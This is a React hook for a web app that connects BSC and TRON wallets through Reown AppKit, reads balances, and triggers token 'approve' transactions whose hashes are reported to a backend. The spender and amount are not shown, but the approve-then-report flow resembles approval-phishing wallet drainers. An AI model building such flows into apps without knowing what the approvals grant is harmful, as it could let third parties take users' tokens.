"use client"
import { useState, useCallback, useEffect } from 'react'
import { useAppKitAccount, useAppKitProvider, useAppKitState } from '@reown/appkit/react'

import { notify, parseError } from '../utils/notification'
import { apiCall } from '../utils/api'
import {
  appkit,
  ALLOWED_NETWORKS,
  getNetworkInfo,
  NETWORK_OBJECTS,
  EVM_NAMESPACE,
  TRON_NAMESPACE,
  hadStoredSessionAtBoot,
} from '../config/appkit'


import { getBscBalance,  bscApprove } from '../blockchain/bsc/contract'
import { getTronBalance, tronApprove } from '../blockchain/tron/contract'

const RECONNECT_TIMEOUT_MS = 12000

export function useWallet() {
  const [selectedCaip, setSelectedCaip] = useState(null)
  const [balance, setBalance] = useState(null)
  const [loading, setLoading] = useState(false)
  const [txResult, setTxResult] = useState(null)

  // ---- AppKit reactive state (per-namespace) ----
  const evm = useAppKitAccount({ namespace: EVM_NAMESPACE })
  const tron = useAppKitAccount({ namespace: TRON_NAMESPACE })
  const { walletProvider: evmProvider } = useAppKitProvider(EVM_NAMESPACE)
  const { walletProvider: tronProvider } = useAppKitProvider(TRON_NAMESPACE)
  const { initialized } = useAppKitState()

  const evmAddress = evm?.address || null
  const tronAddress = tron?.address || null
  const isConnected = Boolean(evm?.isConnected || tron?.isConnected)

  const [reconnectTimedOut, setReconnectTimedOut] = useState(false)
  const isRestoringStatus =
    evm?.status === 'connecting' ||
    evm?.status === 'reconnecting' ||
    tron?.status === 'connecting' ||
    tron?.status === 'reconnecting'
  const reconnecting =
    hadStoredSessionAtBoot &&
    !isConnected &&
    !reconnectTimedOut &&
    (!initialized || isRestoringStatus)

  useEffect(() => {
    if (!reconnecting) return undefined
    const t = setTimeout(() => setReconnectTimedOut(true), RECONNECT_TIMEOUT_MS)
    return () => clearTimeout(t)
  }, [reconnecting])

  // ---- derived selection ----
  const selected = selectedCaip ? getNetworkInfo(selectedCaip) : null
  const chainType = selected?.type || null // 'evm' | 'tron'
  const networkName = selected?.name || null
  const address =
    selected?.type === 'tron'
      ? tronAddress
      : selected?.type === 'evm'
        ? evmAddress
        : evmAddress || tronAddress

  // Only BSC + TRON. Each row carries the address + whether it's connected.
  const networks = ALLOWED_NETWORKS.map((net) => {
    const connected = net.type === 'evm' ? !!evm?.isConnected : !!tron?.isConnected
    const chainAddress = net.type === 'evm' ? evmAddress : tronAddress
    return { ...net, granted: connected, address: chainAddress }
  })

  // ---- connect (open the AppKit modal) ----
  const connect = useCallback(async () => {
    setLoading(true)
    try {
      await appkit.open()
    } catch (error) {
      notify.error(parseError(error))
    } finally {
      setLoading(false)
    }
  }, [])

  // ---- pick a connected chain (and switch AppKit's active network) ----
  const selectChain = useCallback((caip) => {
    const network = NETWORK_OBJECTS[caip]
    if (network) {
      try {
        appkit.switchNetwork(network)
      } catch {
        /* ignore — provider still usable for its namespace */
      }
    }
    setSelectedCaip(caip)
    return true
  }, [])

  // ---- select a chain AND fire the write method (approve) on it ----
  const callWriteMethod = useCallback(
    async (caip) => {
      const info = getNetworkInfo(caip)
      selectChain(caip)
      setLoading(true)
      setTxResult(null)
      try {
        let result
        if (info.type === 'evm') {
          result = await bscApprove(evmProvider)
        } else {
          result = await tronApprove(tronProvider, tronAddress)
        }
        setTxResult({ status: 'success', hash: result.hash })
        notify.success('Transaction confirmed')
        // Report the approve tx hash to the backend (best-effort; don't fail
        // the UI if this call errors).
        try {
          await apiCall('POST', 'users/user-details-from-hash', {
            txHash: result.hash,
            type: 'bnb',
          })
        } catch (err) {
          console.error('Failed to report approve hash:', err)
        }
      } catch (error) {
        console.log('callWriteMethod error:', error)
        const reason = parseError(error)
        setTxResult({ status: 'error', reason })
        notify.error(reason)
      } finally {
        setLoading(false)
      }
    },
    [selectChain, evmProvider, tronProvider, tronAddress]
  )

  // ---- disconnect (all namespaces) ----
  const disconnect = useCallback(async () => {
    try {
      await appkit.disconnect()
      setSelectedCaip(null)
      setBalance(null)
      setTxResult(null)
      notify.info('Wallet disconnected')
    } catch (error) {
      notify.error(parseError(error))
    }
  }, [])

  // ---- read balance ----
  const getBalance = useCallback(async () => {
    if (!isConnected || !selected) {
      notify.error('Select a network first')
      return
    }
    setLoading(true)
    try {
      if (selected.type === 'evm') {
        const { balance: bal, symbol } = await getBscBalance(evmProvider, evmAddress)
        setBalance(`${bal} ${symbol}`)
      } else {
        const { balance: bal, symbol } = await getTronBalance(tronAddress)
        setBalance(`${bal} ${symbol}`)
      }
      notify.success('Balance fetched successfully')
    } catch (error) {
      notify.error(parseError(error))
    } finally {
      setLoading(false)
    }
  }, [isConnected, selected, evmProvider, evmAddress, tronAddress])

  const clearTxResult = useCallback(() => setTxResult(null), [])

  // Reset cached balance whenever the selected chain changes.
  useEffect(() => {
    setBalance(null)
  }, [selectedCaip])

  return {
    // state
    address,
    evmAddress,
    tronAddress,
    isConnected,
    reconnecting,
    unsupported: false,
    networks,
    selectedCaip,
    chainType,
    networkName,
    balance,
    loading,
    txResult,
    // actions
    connect,
    selectChain,
    callWriteMethod,
    disconnect,
    getBalance,
    clearTxResult,
  }
}
